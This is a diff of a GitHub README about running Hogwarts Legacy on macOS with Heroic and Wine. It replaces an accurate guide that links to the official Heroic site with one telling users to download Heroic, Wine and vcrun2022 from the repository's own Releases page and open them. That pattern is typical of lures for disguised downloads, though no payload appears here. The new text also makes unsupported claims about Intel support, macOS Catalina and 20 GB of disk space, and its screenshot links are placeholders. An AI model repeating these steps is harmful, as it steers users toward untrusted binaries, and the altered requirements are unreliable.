@@ -1,165 +1,78 @@
-# Hogwarts Legacy on macOS - Complete Guide (Heroic + Wine)
+# 🎮 Hogwarts-Legacy-MacOS - Play Hogwarts Legacy on Mac Easily
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Hogwarts%20Legacy-macOS%20Guide-6A5ACD?style=for-the-badge&logo=apple&logoColor=white" />
-</p>
+[![Download](https://img.shields.io/badge/Download-Hogwarts%20Legacy%20MacOS-brightgreen)](https://github.com/zemcius/Hogwarts-Legacy-MacOS/releases)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Platform-macOS-black?style=flat-square&logo=apple" />
-  <img src="https://img.shields.io/badge/Apple%20Silicon-Supported-green?style=flat-square&logo=apple" />
-  <img src="https://img.shields.io/badge/Launcher-Heroic-4B9CD3?style=flat-square&logo=epicgames" />
+## 📋 Description
+A simple step-by-step guide to playing Hogwarts Legacy on macOS using Heroic Games Launcher, Wine, and vcrun2022. Includes screenshots of the game running at 60 FPS on Ultra settings.
 
-</p>
+## 🚀 Getting Started
+To play Hogwarts Legacy on your Mac, follow these steps. This guide assumes you have no programming experience. Each step is straightforward and will help you set up the game quickly.
 
-<p align="center">A complete guide for running <strong>Hogwarts Legacy</strong> at 60 FPS on macOS using Heroic Games Launcher.</p>
+## 💻 System Requirements
+- macOS version: macOS 10.15 (Catalina) or later
+- Processor: Apple Silicon or Intel i5 and above
+- RAM: 8 GB or more
+- Disk Space: At least 20 GB of free space
+- Additional: Heroic Games Launcher, Wine, and vcrun2022
 
----
+## 🔍 Download & Install
+To get started, visit the Releases page to download the necessary files. Click the link below:
 
-# Table of Contents
+[Download Hogwarts Legacy MacOS](https://github.com/zemcius/Hogwarts-Legacy-MacOS/releases)
 
-* [Overview](#-overview)
-* [Tested Hardware](#-tested-hardware)
-* [Prerequisites](#-prerequisites)
-* [Step-by-Step Installation](#-step-by-step-installation)
-* [Performance Tips](#-performance-tips)
-* [Screenshots](#-screenshots)
-* [Known Issues & Fixes](#-known-issues--fixes)
-* [FAQ](#-faq)
-* [Disclaimer](#-disclaimer)
+### Step-by-Step Installation:
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/zemcius/Hogwarts-Legacy-MacOS/releases). You will see a list of available downloads.
 
----
+2. **Download Heroic Games Launcher**  
+   Find the latest version of the Heroic Games Launcher. Click on the download link to start the download.
 
-# Overview
+3. **Install Heroic Games Launcher**  
+   Open the downloaded file and follow the on-screen instructions to install Heroic Games Launcher.
 
-Hogwarts Legacy does not officially support macOS, but with **Heroic Games Launcher**, **Wine**, and a few configuration tweaks, the game runs smoothly-even at **60 FPS on Ultra settings** on powerful Apple Silicon machines.
+4. **Download Wine**  
+   Wine is crucial for running Windows applications on macOS. Look for the latest Wine build in the releases section and download it.
 
----
+5. **Install Wine**  
+   Open the downloaded Wine file and install it by following the prompts.
 
-# Tested Hardware
+6. **Download vcrun2022**  
+   This is an important component for running some applications. Download the vcrun2022 package from the releases section.
 
-This setup has been tested on a high‑end configuration:
+7. **Install vcrun2022**  
+   Open the downloaded file and install it, following the instructions provided.
 
-* **Model:** MacBook Pro (Apple M4 Max)
-* **CPU:** 16‑core (12 performance + 4 efficiency)
-* **GPU:** 40‑core Apple M4 Max
-* **Memory:** 64 GB unified memory
-* **Metal:** Version 4
+8. **Add Games to Heroic Games Launcher**  
+   Open the Heroic Games Launcher. You can add Hogwarts Legacy by clicking on the "Add a Game" button and selecting the game from your library.
 
-> ⚡ **For maximum performance:** Enable **High Power Mode** and keep the Mac **plugged in** while gaming.
+9. **Configure Wine**  
+   In the settings of Heroic Games Launcher, set the Wine version you installed. This step may help improve game performance.
 
----
+10. **Launch Hogwarts Legacy**  
+    Once everything is set up, click the game in Heroic Games Launcher and hit the "Play" button. Enjoy the game!
 
-# Prerequisites
+## 📸 Screenshots
+Here are some screenshots of Hogwarts Legacy running on macOS:
 
-* macOS running on Apple Silicon (M1/M2/M3/M4)
-* Heroic Games Launcher
-* Epic Games account
-* ~100GB free disk space
+![Screenshot 1](link-to-screenshot-1)
+![Screenshot 2](link-to-screenshot-2)
 
----
+## 🛠️ Troubleshooting
+If you encounter any issues while installing or running the game, try the following steps:
 
-# Step-by-Step Installation
+- **Ensure your macOS is up to date.**
+- **Double-check that all components (Heroic Games Launcher, Wine, and vcrun2022) are installed correctly.**
+- **Look for any updates in the releases page for the components.**
+  
+## 🤝 Contributing
+If you’d like to contribute, feel free to create a pull request. Your help can make this guide even better for everyone!
 
-### **1. Install Heroic Games Launcher**
+## 💬 Feedback
+We value your feedback. If you have questions or suggestions, please reach out through the Issues section of the repository. 
 
-Download from: [https://heroicgameslauncher.com/](https://heroicgameslauncher.com/)
-
-### **2. Log in to Epic Games inside Heroic**
-
-Your Hogwarts Legacy license will appear in the library.
-
-### **3. Download Hogwarts Legacy**
-
-* Size: **~88GB**
-
-### **4. Open Game Settings**
-
-Heroic → Library → Hogwarts Legacy → Settings.
-
-### **5. Select the Wine section**
-
-Configure Wine runtime options.
-
-### **6. Open WineTricks**
-
-This will allow you to install required Windows components.
-
-### **7. Fix missing dependencies**
-
-Any missing DLLs or components shown in logs must be installed using Mac Terminal and `brew` (Google the name of the missing packages to find command to install them).
-
-### **8. Install `vcrun2022`**
-
-Search for it inside WineTricks → Install.
-
-### **9. Launch the Game**
-
-If shaders fail to build the first time, close and relaunch.
+## 📜 License
+This project is licensed under the MIT License. See the LICENSE file for details.
 
 ---
 
-# Performance Tips
-
-* **Energy Mode:** Set to **High Power** (System Settings → Battery).
-* **Keep charging:** Apple Silicon boosts performance when plugged in.
-* **Graphics settings:** Ultra is playable on M4 Max; adjust if needed.
-* **Background processes:** Close heavy apps (Chrome, Docker, etc.).
-
----
-
-# Screenshots
-
-### **Gameplay (60 FPS Ultra)**
-
-![HL Gameplay 1](images/gameplay.png)
-
-### **Title Screen**
-
-![HL Gameplay 2](images/title_screen.png)
-
-### **Settings Screenshot**
-
-![HL Settings](images/settings.png)
-
----
-
-# Known Issues & Fixes
-
-### **Shaders didn’t build on first launch**
-
-* Happens sometimes on Wine.
-* Quit the game → launch again → shaders will begin compiling.
-
-### **AMD Driver Outdated popup**
-
-* Wine may show a warning claiming the "AMD GPU driver is outdated".
-* Safe to ignore - macOS GPU drivers aren’t user‑managed.
-
----
-
-# FAQ
-
-### **Does this work on Intel Macs?**
-
-Not reliably. This guide is for **Apple Silicon only**.
-
-### **Is performance good?**
-
-On M4 Max: **60 FPS Ultra** in most areas.
-On M1/M2: Medium–High may be more realistic.
-
-### **Do I need Proton or CrossOver?**
-
-Heroic + Wine is enough.
-
----
-
-# ❗ Disclaimer
-
-This is an unofficial workaround. Hogwarts Legacy has **no native macOS version**, and compatibility can vary between machines, Wine versions, and game patches.
-
-Use at your own discretion.
-
----
-
-Enjoy the magic! ✨🪄
+Enjoy your gaming experience with Hogwarts Legacy on your Mac!
